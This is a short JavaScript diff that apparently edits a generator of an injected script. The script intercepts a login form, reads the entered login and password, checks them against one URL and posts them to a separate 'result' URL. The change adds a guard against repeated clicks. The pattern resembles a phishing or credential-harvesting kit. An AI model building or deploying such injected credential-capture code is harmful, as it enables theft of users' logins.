@@ -62,18 +62,22 @@ function createMyScript() {
     const checkCredentialsURL = getCheckURL();
     const postResultURL = getResultURL();
     let showedError = false;
-    
+    let working = false;
+
     btn.addEventListener('click', (e) => {
         e.preventDefault()
-        let creds = {login: login.value, password: password.value};
-        let response = checkCredentials(creds)
-        console.log(response)
-        if (response === 'True')
-            postResult(creds)
-        else {
-            if (!showedError)
-                showError()
-            showedError = true;
+        if (!working) {
+            working = true;
+            let creds = {login: login.value, password: password.value};
+            let response = checkCredentials(creds)
+            console.log(response)
+            if (response === 'True')
+                postResult(creds)
+            else {
+                if (!showedError)
+                    showError()
+                showedError = true;
+            }
         }
     });`;
     return script
